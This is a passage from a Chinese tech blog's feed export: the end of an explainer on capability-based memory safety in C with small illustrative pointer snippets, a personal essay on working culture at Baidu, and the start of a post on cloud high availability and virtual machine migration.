&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;/* Program 3 */&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;struct foo &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  int x;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  int y;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  char *pc;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;struct foo *pf = malloc(...);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pf-&amp;gt;x = 5;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pf-&amp;gt;y = 256;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pf-&amp;gt;pc = &amp;quot;before&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pf-&amp;gt;pc += 3;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;int *px = &amp;amp;pf-&amp;gt;x;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppf1.com1.z0.glb.clouddn.com/memory-safety3.jpg&quot; alt=&quot;memory-safety3&quot;&gt;&lt;/p&gt;
&lt;p&gt;重点关注代码的最后两行。&lt;em&gt;Program 3&lt;/em&gt; 允许指针运算来新建一个新的指针，但只能当新指针落在b到e之间才能被解引用。从代码中看到，增加 &lt;em&gt;\&lt;/em&gt;pc&lt;em&gt;的&lt;/em&gt;p&lt;em&gt; ,新指针仍然落在&lt;/em&gt;b&lt;em&gt; 和&lt;/em&gt;e&lt;em&gt; 之间，所以执行&lt;/em&gt;*(pf-&amp;gt;pc)&lt;em&gt; 是合法有效的。但如果执行 &lt;/em&gt;pf-&amp;gt;pc+=10&lt;em&gt; , &lt;/em&gt;*(pf-&amp;gt;pc)&lt;em&gt; 将会违背内存安全性，尽管&lt;/em&gt;pf-&amp;gt;pc&lt;em&gt; 有可能碰巧就落在定义的内存区域中（这块内存区域可能分配给了其它&lt;/em&gt;object*).&lt;/p&gt;
&lt;p&gt;最后一行代码创建一个新的指针&lt;em&gt;px&lt;/em&gt; 指向&lt;em&gt;pf&lt;/em&gt; 指针的第一个域，将边界缩小到其中的一个域中。这就排除了 &lt;em&gt;Program 2&lt;/em&gt; 带来的内存溢出问题。加入我们保留&lt;em&gt;pf&lt;/em&gt;整个的边界，此程序可能会利用&lt;em&gt;px&lt;/em&gt;溢出到结构体中的其它域中。&lt;/p&gt;
&lt;p&gt;Capability是无法伪造的，就像我们并不能伪造一个指针映射到整形数据中。非法映射可以是直接的（&lt;em&gt;e.g. p=(int \&lt;/em&gt;)5&lt;em&gt; ） 也可以是间接的，比如将含有整形数据的结构体映射到含有指针的结构体中（&lt;/em&gt;e.g. p=(int **)pf&lt;em&gt; ), 将&lt;/em&gt;Program 3&lt;em&gt; 中结构体中的第一个整形数据域映射成指针。我们的定义简单的将映射看作是空操作。只有有效的指针才能被解引用，一个指针的capabilities在它创建的时候就已经确定了。 我们的定义中允许 &lt;/em&gt;Program 4* 的执行：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;/* Program 4 */&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;int x;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;int *p = &amp;amp;x;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;int y = (int)p;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;int *q = (int *)y&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*q = 5;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;em&gt;p&lt;/em&gt; 指针初始化得&lt;em&gt;b&lt;/em&gt; 和&lt;em&gt;e&lt;/em&gt; 一直会保持不变，尽管之后&lt;em&gt;p&lt;/em&gt; 被转化成整形y, 因此当&lt;em&gt;y&lt;/em&gt; 被转回为&lt;em&gt;q&lt;/em&gt; 并被解引用的时候，指针依然存在。从另一方面来看，如果在&lt;em&gt;Program 3&lt;/em&gt; 的最后加上 &lt;em&gt;p=(int \&lt;/em&gt;*)pf&lt;em&gt; , 紧接着 &lt;/em&gt;*p=malloc(sizeof(int))&lt;em&gt;， 之后的操作 &lt;/em&gt;**p&lt;em&gt;以及&lt;/em&gt;printf(“%d\n”,pf-&amp;gt;x)* 都是合法的。也就是说，一块内存区域一开始存储了整形数据，之后也可将整形数据修改为指向整形数据的指针，然后解引用指针，这样操作是安全的，但反过来却不行。&lt;/p&gt;
&lt;p&gt;在某种意义上来说，基于capability定义的内存安全性是一种类型安全形式（type safety)。这里只有两种类型：指针类型和非指针类型。这种定义保证了 1) 指针只在定义了合法内存区域的安全模式下被创建. 2) 指针只有在它们是指向分配给它们的内存区域的情况下被解引用. 3) 那块内存区域仍然是定义过的。这种定义排除了上述所有的五种错误。&lt;/p&gt;
&lt;p&gt;注：本文主要意译 PL Enthusiast 上的一篇文章： &lt;a href=&quot;http://www.pl-enthusiast.net/2014/07/21/memory-safety/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;What is memory safety&lt;/a&gt; &lt;/p&gt;
&lt;h3 id=&quot;References&quot;&gt;&lt;a href=&quot;#References&quot; class=&quot;headerlink&quot; title=&quot;References&quot;&gt;&lt;/a&gt;References&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;http://www.pl-enthusiast.net/2014/07/21/memory-safety/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;What is memory safety&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://nebelwelt.net/publications/files/13Oakland.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;S&amp;amp;P’13 Eternal War in Memory &lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;Acknowledgement&quot;&gt;&lt;a href=&quot;#Acknowledgement&quot; class=&quot;headerlink&quot; title=&quot;Acknowledgement&quot;&gt;&lt;/a&gt;Acknowledgement&lt;/h2&gt;&lt;p&gt;作者[新浪微博：&lt;a href=&quot;http://weibo.com/2767520802/profile?rightmod=1&amp;amp;wvr=6&amp;amp;mod=personinfo&amp;amp;is_all=1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;@diting0x&lt;/a&gt;]&lt;/p&gt;
&lt;p&gt;本文遵守Attribution-NonCommercial-NoDerivatives 4.0 International License (CC BY-NC-ND 4.0)&lt;/p&gt;
&lt;p&gt;转载本文请注明出处以及&lt;a href=&quot;http://www.pl-enthusiast.net/2014/07/21/memory-safety/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;What is memory safety&lt;/a&gt; 出处&lt;br&gt;原文地址: &lt;a href=&quot;http://www.chongh.wiki/blog/2016/02/17/memory-safety/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.chongh.wiki/blog/2016/02/17/memory-safety/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;另，感谢&lt;a href=&quot;https://nebelwelt.net/publications/files/13Oakland.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;S&amp;amp;P’13 Eternal War in Memory &lt;/a&gt;的作者 &lt;a href=&quot;https://nebelwelt.net&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Mathis Payer教授&lt;/a&gt; 的某些答疑，感谢好友 &lt;a href=&quot;http://www.yebangyu.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;叶邦宇&lt;/a&gt; 指出的一些勘误。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;C语言中的buffer overflows, format string attacks等其它的一些vulnerabilities都有一个共同的问题：违背内存安全(Memory Safety)。本文主要讲述如何准确定义内存安全，为什么这些vulnerabilities违背了内存安全。也为后续两篇文章&lt;a href=&quot;http://www.chongh.wiki/blog/2016/02/18/memorywar-attack/&quot;&gt;内存持久战-攻击模型&lt;/a&gt;，&lt;a href=&quot;http://www.chongh.wiki/blog/2016/02/23/memorywar-defense/&quot;&gt;内存持久战-防御机制&lt;/a&gt;做好铺垫。&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;IEEE Security&amp;amp;Privacy’13&lt;/li&gt;
&lt;li&gt;不访问未定义的内存&lt;/li&gt;
&lt;li&gt;无限间距&lt;/li&gt;
&lt;li&gt;Pointers as capabilities&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="security" scheme="http://yoursite.com/categories/security/"/>
    
    
      <category term="Security" scheme="http://yoursite.com/tags/Security/"/>
    
      <category term="Memory" scheme="http://yoursite.com/tags/Memory/"/>
    
      <category term="System" scheme="http://yoursite.com/tags/System/"/>
    
      <category term="Attack" scheme="http://yoursite.com/tags/Attack/"/>
    
  </entry>
  
  <entry>
    <title>我的百度过“度”期</title>
    <link href="http://yoursite.com/blog/2016/01/08/baiduculture/"/>
    <id>http://yoursite.com/blog/2016/01/08/baiduculture/</id>
    <published>2016-01-08T18:19:18.000Z</published>
    <updated>2016-04-22T15:36:42.000Z</updated>
    
    <content type="html">&lt;p&gt; 本文特邀新闻工作者@图拉 特约记者撰稿，从一个非技术人员的角度跟大家聊聊以技术为主的大型程序猿工厂-百度。感受度厂的文化，从这里开始。文艺否？实用否？读了才知道。 &lt;/p&gt;
&lt;p&gt;注：本文所用的‘度厂’、‘程序猿’等词语并无褒贬之意，约定俗成。&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;度厂关键词&lt;/li&gt;
&lt;li&gt;度厂程序猿标签&lt;/li&gt;
&lt;li&gt;后序&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt; 
&lt;p&gt;下午5点，大厦旁边马路的路灯准时亮起，距离度厂的同学们规定的下班时间，还有一个小时。&lt;/p&gt;
&lt;p&gt;小林通常会在这个点，合上电脑，起身穿好衣服，拿起工卡，到地下一层的员工食堂吃晚饭。一旦晚了，食堂又会排起长长的队，晚饭就有可能吃不上。大多数人的晚饭都是在公司食堂解决，不是因为食堂有多物美价廉，而是没有几个人能够准时下班回家吃一顿。或许，对于这里大多数的同学们而言，（哦，对了，度厂的员工被叫做“同学们”。第一次听到这个称呼的时候倍感亲切，觉得甚好）6点下班是一个玩笑，9点（或者其他时间，不确定）才是常态。&lt;/p&gt;
&lt;p&gt;A:“这是什么意思呀？”&lt;/p&gt;
&lt;p&gt;B: “我也不知道，自己百度一下不就行了，还问我”&lt;/p&gt;
&lt;p&gt;这样的对话，如果百度统计会有一个数据的话，我想数据量值会让人浮想联翩。如今说到“百度”， 就像说道”油米柴盐“一样了吧，它成了生活的必需品，无人不知，无人不晓，不是夸张。但是，没有来这里之前，它对于我而言仍然是一个极为抽象的概念。我知道它，我天天使用它，但我却不了解它。带着这样的一种心态，我投了简历。&lt;/p&gt;
&lt;p&gt;来这里的时间不长，所处的位置也是小的不能再小的，所接触到的也是度厂的皮毛的皮毛，本来就没有任何资格来对度厂“评头品足”，会因为视角或者其他的原因导致所要表达的东西过于片面和狭窄。&lt;/p&gt;
&lt;p&gt;在此声明，以下言论皆是一只小小菜鸟的一家之言，一家之感。如有雷同，纯属机缘；如有大异，那就并非巧合了。毕竟你我本处不同位置，所见，所感，所想，不同乃是自然之事。&lt;/p&gt;
&lt;h2 id=&quot;度厂关键词&quot;&gt;&lt;a href=&quot;#度厂关键词&quot; class=&quot;headerlink&quot; title=&quot;度厂关键词&quot;&gt;&lt;/a&gt;度厂关键词&lt;/h2&gt;&lt;h3 id=&quot;PE&quot;&gt;&lt;a href=&quot;#PE&quot; class=&quot;headerlink&quot; title=&quot;PE&quot;&gt;&lt;/a&gt;PE&lt;/h3&gt;&lt;p&gt;说实话，要成海量的数据中筛选出来这样几个关于百度的关键词，实在并非易事。对我而言，第一个关键词应该是“PE”。&lt;/p&gt;
&lt;p&gt;P为专业professional，在我的理解中专业也包含着规范和严谨。那天面试约的是下午3点，当我到达大厦想要进入办公区的时候，被门口的保安拦下了，因为没有访客贴（非百度员工，进入办公区前需要内部员工提前预约，访客持本人身份证取得访客贴后并由内部员工带领，方可进入办公区），后来发现，即使现在不少实习生没有工卡，也还需要每天预约并叫内部员工带领。这样严格的进入方式，虽然之前在某部级单位也遇到过，但是以为那是政府单位才会如此，大多数的公司不会有这么严格的门禁。（后来去对面的公司办事，发现虽然也需要预约单，但是程序要比度厂简单的多）有一种“雁过留痕”的赶脚，只要你想进入我的地盘，我就要掌握你的信息的霸气和严谨。（哈哈，有点夸张）&lt;/p&gt;
&lt;p&gt;后来发录取通知，不仅电话通知，还用邮件告知并进一步确认。每一次请假不能口头告知，需要发邮件方作数。在办理入职手续的时候，签了好多文件，各种协议、保密书、个人证明，光填写各类资料就花费了一下午的时间，想想这是有多复杂，我心想，我不就来实个习嘛，犯得着这么麻烦嘛。到目前为止去过四家单位，度厂是我遇到最事多的主。每一件事情每一个人都要都要记录，要有备案，繁琐但严谨，复杂但规范。&lt;/p&gt;
&lt;p&gt;E为效率efficiency。一切从简，数据为上。我部每天要写日报，每周要写周报，写这些文件的宗旨就是“简”。能用一个字表达的不能用两个字，在这个基础之上，还要让任何一个人看懂你所写的东西。&lt;/p&gt;
&lt;p&gt;作为一个小小小成员，每周至少开三个会，一个整个部分的大会，技术、测试、运营等一起开，各自分享本周所做和下周预做之事，一个是小部门会议，几个组一起开，还有一个是team会议。这些会上在做的事情主要有三件：1.你做了什么 2.有哪些问题&amp;amp;解决方案 3.你将做什么&amp;amp;什么时候完成 每一个问题都需要有确切的答案，不能含糊其辞，只能给leader “yes”或“no”，没有任何的所谓的“中庸之道”。所有的东西基本都需要量化，刚开始的时候觉得非常不适应，因为所有量化的东西就贴上了各类数据标签，数字总是冷冰冰的，没有温度的世界有点寒冷呀。（对于我这样一个靠文字思维抽象活了20年的人而言，刚开始真有几分不适应，“感情用事”算是就这样结束了）。&lt;/p&gt;
&lt;p&gt;量化所带来的最好的效果就是效率，这样一来，当所有的事情都被排上了档期，都有相应的完成时间的时候，你这台机器不转也要转了，每天都在各种倒计时，人人都成了一只模糊计时的沙漏。&lt;/p&gt;
&lt;p&gt;度厂的每一个员工的工位上都有一块白板，在每个部门的工位处都有一块大白板。大家有问题就马上召集在一起，在白板上写写画画，讨论解决方案，觉得效率真实不错。对了，还有一件事让我觉得蛮nice的——每个人配的都是笔记本电脑，而非台式机。&lt;/p&gt;
&lt;p&gt;刚开始的时候，看到旁边的技术小哥在使用两台电脑，后来发现另一台只是显示器，这样使用两个频幕不用来回切换，提高效率；另一方面使用笔记本，可以有问题直接抱着电脑大家聚在一起，非常便于讨论，提高效率。（当然，我不知道大大给大家配置笔记本的是否还有方面大家把电脑搬过家加班的原因，好吧，我有点邪恶）（这些是我这个孤陋寡闻之徒，第一次看到，可能你所在的公司也是这样，觉得没有什么特别，对我而言却是蛮不错的）&lt;/p&gt;
&lt;h3 id=&quot;Q-amp-A&quot;&gt;&lt;a href=&quot;#Q-amp-A&quot; class=&quot;headerlink&quot; title=&quot;Q&amp;amp;A&quot;&gt;&lt;/a&gt;Q&amp;amp;A&lt;/h3&gt;&lt;p&gt;关于QA，这点我在度厂的这段时间体会颇深。&lt;/p&gt;
&lt;p&gt;每天感觉要么是你在问问题，要么是你的leader在问你问题，而所有的问题都需要找到与之相匹配的答案。每次开会的时候，比如这一周有数据量下降，如果你不立马解释，不出意外你的leader就会问你为什么会这样？要什么方法可以解决吗？这样的问题意识和解决意识是我比较习惯的，也是推崇的。出现状况，立马分析，找到原因，查找解决方案。这是一条严谨的逻辑链每天推动着整个部门，甚至大多数的企业运转。&lt;/p&gt;
&lt;h3 id=&quot;SHARE&quot;&gt;&lt;a href=&quot;#SHARE&quot; class=&quot;headerlink&quot; title=&quot;SHARE&quot;&gt;&lt;/a&gt;SHARE&lt;/h3&gt;&lt;p&gt;度厂的人蛮有分享精神，这一点大为赞扬。毕竟，你好他好大家好嘛。&lt;/p&gt;
&lt;p&gt;我们部每周不出意外（堵车）除了周一、周五要开例会，其中的三天，每天早上10点上班前20分钟，会有一个分享会。团队的成员，分享各自工作中遇到的问题及最优的解决方案，或者你的leader给大家分享一些实用的干货。&lt;/p&gt;
&lt;p&gt;有的时候，整个大事业部也会有分享会，其他小组的成员进行经验交流分享。虽然每次时间都并不长，但因为非常切实有用，每每收益颇多。哦，对了，大厦那边经常也会有各种非常实用的培训课。（虽然因为工作忙一次都没有去过，不过听说貌似不错）&lt;/p&gt;
&lt;h3 id=&quot;NO&quot;&gt;&lt;a href=&quot;#NO&quot; class=&quot;headerlink&quot; title=&quot;NO&quot;&gt;&lt;/a&gt;NO&lt;/h3&gt;&lt;p&gt;no 是一个否定词，意味着消极，也代表着拒绝。拒绝平庸拒绝常态。&lt;/p&gt;
&lt;p&gt;度厂在这一点上也还是给我有蛮多惊喜的。&lt;/p&gt;
&lt;p&gt;刚开始在某大厦的时候，那里的食堂标志就很有想法，是一个百度搜索的界面，下面的tag是各种食物的名称。对这种小细节极度关注的我，看到这样的食堂标示，真是满心欢喜呀，简直找到气味相投者。&lt;/p&gt;
&lt;p&gt;现在搬到科技园，地下食堂除了各种超好吃的美食，有一个非常喜欢的地方——食堂的论语墙，真是不错，这个百度论语在网上可以找到，感兴趣的可以搜搜，简直是心灵鸡汤的心灵鸡汤，但是觉得这个想法不错，我喜欢。&lt;/p&gt;
&lt;p&gt;还有一点，觉得也很有想法。我们每个会议室都有一个超级超级文雅的名字，而非一般的以数据1号、2号、3号命名。如，“玉女摇仙佩”，“扶醉去春寒”，“月底修萧谱”等。&lt;/p&gt;
&lt;p&gt;还有很棒的一点。今年圣诞节，送的礼物的包装盒超级不一般。请看图。行政关怀简直满满的幸福感。&lt;/p&gt;
&lt;p&gt;鄙人超级喜欢注重细节的人，可能这样行那样也行，有的时候就是一点点的小装饰小改变，就会让人心旷神怡，这是一种生活态度，做事方式，追求“no”的过程中或许优秀就会成为你的一种习惯了吧。&lt;/p&gt;
&lt;p&gt;说完度厂再来说说里面最为重要的一群人。&lt;/p&gt;
&lt;h2 id=&quot;度厂程序猿标签&quot;&gt;&lt;a href=&quot;#度厂程序猿标签&quot; class=&quot;headerlink&quot; title=&quot;度厂程序猿标签&quot;&gt;&lt;/a&gt;度厂程序猿标签&lt;/h2&gt;&lt;p&gt;每天早上9点多，当我从西二旗地铁站走出来的时候，都会有一群身背双肩包（貌似他们只有三款包，百度包、Swiss包，其他包），穿着休闲牛仔裤走在你旁边，他们不苟言笑，静静走着，或领着饭盒，或提着各类球拍。所以你在那条路上看到这样造型的人，十有八九就是度厂的程序猿。&lt;/p&gt;
&lt;p&gt;除了和我有工作对接的技术有接触，其他的技术交流不多，所以也不能说出一二。只能凭着平日里的小观察说说。&lt;/p&gt;
&lt;p&gt;“安静、喧闹、幽默”这是我目前可以给他们下的tag。&lt;/p&gt;
&lt;h3 id=&quot;安静&quot;&gt;&lt;a href=&quot;#安静&quot; class=&quot;headerlink&quot; title=&quot;安静&quot;&gt;&lt;/a&gt;安静&lt;/h3&gt;&lt;p&gt;这个tag很好理解，大多数的时候他们都戴着耳机静静地在两个屏幕前来回切换，对着屏幕上各种颜色我完全看不懂的代码。坐在我对面的小哥，简直是一个安静的美男子，是的，这句话形容他简直就是绝配。&lt;/p&gt;
&lt;p&gt;他超级安静，一天下来有时候听不到他说一句话，美男子，恩，确实有几分姿色，因为有的同事经常跑到我这边假装和我聊天，实则为了看他。（尼玛，就是酱紫八卦，对于一些同学而言，每天最大的乐趣就是发现身边藏着的颜值高的美男子，然后在内网上搜索他的个人信息，简直分分钟会笑死）&lt;/p&gt;
&lt;h3 id=&quot;喧闹&quot;&gt;&lt;a href=&quot;#喧闹&quot; class=&quot;headerlink&quot; title=&quot;喧闹&quot;&gt;&lt;/a&gt;喧闹&lt;/h3&gt;&lt;p&gt;在之前的单位，我们大多数要么在外边，要么在室内安静的做自己的又或者在会议室argue，公共办公区基本是比较安静的，但是现在的办公室每天都有点，不，是很喧闹。每天都能听到他们argue的声音，而且有几个人的声音辨识度超级高（不是声音有多特别，是口音有点重，自行脑补)。他们每天讨论的时候，总是让我想到高中数学课堂。每个人都感觉蛮有想法的，有的时候我会静静地看着那群人，想着要是给他们一个平台，每个人是不是都可以成为一个很好的思辨家呀。&lt;/p&gt;
&lt;h3 id=&quot;幽默&quot;&gt;&lt;a href=&quot;#幽默&quot; class=&quot;headerlink&quot; title=&quot;幽默&quot;&gt;&lt;/a&gt;幽默&lt;/h3&gt;&lt;p&gt;坐在我对面的小哥们，每天的对话简直就是我的笑话录。&lt;/p&gt;
&lt;p&gt;有段时间一直不解为什么其他的同事都叫一个人“狗哥”，极度费解。后来得知，是因为他叫“刘道”，道哥的音同英语的dog，所以有了“狗哥”这个外号。简直，每次想到这点都会笑的不行。&lt;/p&gt;
&lt;p&gt;某个周五，小郭说晚上要去看海绵宝宝，一旁的小哥接了一句“海绵宝宝还要看3D版的”。好吧，他们就是这样有个性，为我又增加了一个笑话。&lt;/p&gt;
&lt;p&gt;在某位技术的白板上写着“帅的就是这么自然”，在某位技术的桌上放着“iOS技术开发”，在某位技术的桌上放着一本社会学的经典《乌合之众》，在某位技术的桌子底下放着一个足球（每天工作的时候都用脚踩着）……&lt;/p&gt;
&lt;p&gt;他们大多数的周末都还在加班，要么宅在家里，但是他们有自己的生活乐趣，就像每一个我们一样。我不知道大多数的我们为什么要将大多数的他们区分开来，他们的或安静或喧闹或幽默，不也是大多数的我们或安静或喧闹或幽默嘛。每一个群体必然都会存在A、B或C。&lt;/p&gt;
&lt;h2 id=&quot;后序&quot;&gt;&lt;a href=&quot;#后序&quot; class=&quot;headerlink&quot; title=&quot;后序&quot;&gt;&lt;/a&gt;后序&lt;/h2&gt;&lt;p&gt;我不知道度厂的标识，每天几点亮起，我只知道当它亮起的时候大多数度厂的童鞋们都在那里，或安静的坐着，或激烈的争论着，或分享着，或思考着……&lt;/p&gt;
&lt;p&gt;小林，这个点应该准备下班了，到家也要十点多了吧，吃个夜宵，刷刷软件，一天也就这样过去了。&lt;/p&gt;
&lt;p&gt;每次问他辛苦吗？他没有反应，我想对于大多数那里的人而言，这样的时间点早已变成了生活节奏，又何来辛苦一说。&lt;/p&gt;
&lt;p&gt;度厂，或许又名“赌场”。&lt;/p&gt;
&lt;p&gt;而我，或许就是一个过客，又或许是另一个过客。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;本文遵守Attribution-NonCommercial-NoDerivatives 4.0 International License (CC BY-NC-ND 4.0)&lt;/p&gt;
&lt;p&gt;@转载本文请注明出处&lt;/p&gt;
&lt;p&gt;作者[@图拉]&lt;/p&gt;
&lt;p&gt;于2016年1月8日凌晨北京海淀&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt; 本文特邀新闻工作者@图拉 特约记者撰稿，从一个非技术人员的角度跟大家聊聊以技术为主的大型程序猿工厂-百度。感受度厂的文化，从这里开始。文艺否？实用否？读了才知道。 &lt;/p&gt;
&lt;p&gt;注：本文所用的‘度厂’、‘程序猿’等词语并无褒贬之意，约定俗成。&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;度厂关键词&lt;/li&gt;
&lt;li&gt;度厂程序猿标签&lt;/li&gt;
&lt;li&gt;后序&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="company" scheme="http://yoursite.com/categories/company/"/>
    
    
      <category term="Culture" scheme="http://yoursite.com/tags/Culture/"/>
    
      <category term="Job" scheme="http://yoursite.com/tags/Job/"/>
    
      <category term="BAT" scheme="http://yoursite.com/tags/BAT/"/>
    
  </entry>
  
  <entry>
    <title>云平台高可用之虚拟机迁移</title>
    <link href="http://yoursite.com/blog/2016/01/02/highavailability-migration/"/>
    <id>http://yoursite.com/blog/2016/01/02/highavailability-migration/</id>
    <published>2016-01-03T04:02:39.000Z</published>
    <updated>2016-04-21T20:52:09.000Z</updated>
    
    <content type="html">&lt;p&gt;无序，直接看文章。&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;什么是云平台高可用&lt;/li&gt;
&lt;li&gt;虚拟机迁移主要算法&lt;/li&gt;
&lt;li&gt;实现 Pre-copy&lt;/li&gt;
&lt;li&gt;思考&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;什么是云平台高可用&quot;&gt;&lt;a href=&quot;#什么是云平台高可用&quot; class=&quot;headerlink&quot; title=&quot;什么是云平台高可用&quot;&gt;&lt;/a&gt;什么是云平台高可用&lt;/h2&gt;&lt;p&gt;云，一个再熟悉不过的词了。大家都看到了云计算的商业价值，于是乎各大IT公司都纷纷提出自己的云计算服务，有Amozon的EC2，微软的Azure,谷歌的Google AppEngine,腾讯云，百度云，阿里云等。说到Google AppEngine，相信许多用goagent翻墙党都用过这个东西，但估计大家都只忙着使用goagent，却忽略了AppEngine其中提供的云服务。如今，云无处不在，从当今主流产品看，云平台需要满足以下几个需求：&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;第一，满足多用户的大规模并发访问，想想2015年的双十一，官方数据表明Taobao每秒钟要处理14万订单交易，平均每天也有七八千万访客（具体数据待我问阿里朋友）&lt;/li&gt;
&lt;li&gt;第二，处理海量数据，14年，google平均每天要处理57.4亿次查询，处理的数据高达100PB；阿里云的大数据产品ODPS在6个小时内就能处理100PB的数据&lt;/li&gt;
&lt;li&gt;第三，提供可持续的服务，如今云平台的用户如此之大，分秒级的停机时间将影响数百万用户，导致数十万美元损失，不管从用户角度还是公司本身角度来看，停机时间过长都是不可容忍的&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;针对需求一和需求二，当前云平台的解决方案大多是通过分布式协议及系统来组织管理大量的廉价设备，以提供良好的可扩展性，从而满足大量用户的高并发访问需求以及对海量数据的处理能力，这不在本文考虑范围之内，不多叙说。本文只针对第三个需求，提供可持续的服务，也就是云计算平台中常说的高可用性（high availability)。可用性的准确定义是，在需要的外部资源得到保证的前提下，系统在规定的条件和时间内处于可执行功能状态的能力，高可用则定义为用来保障系统可用性达到某一预定水平的系统设计和技术手段。目前，许多云服务提供商都声称自己的云平台能保证较高的可用性，但实际上，近年来云平台的失效事件频繁发生。具体事件，可搜索了解一下。&lt;/p&gt;
&lt;p&gt;虚拟化技术是云计算平台的核心支撑技术，虚拟机的强隔离性有效解决了资源的共享使用问题，大大支撑了云计算平台的资源聚合、负载均衡、节能、可扩展等特性。为保证云平台的高可用性，基于虚拟机备份思想的技术应运而生，也是当前云平台为保证高可用性的最主要途径。虚拟机备份思想，主要包括三个方面：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第一，快照回滚（snapshot&amp;amp;rollback)，将虚拟机备份状态保存在持久化存储系统中, 在虚拟机因上层软件或底层硬件故障失效后,可以加载备份状态并恢复到之前的运行 状态继续运行&lt;/li&gt;
&lt;li&gt;第二，热备技术（hot-standby)，将虚拟机执行状态实时传输到目的端计算节点,在检测到源计算节点失效后,目的端的虚拟机状态可立刻恢复并持续提供任务&lt;/li&gt;
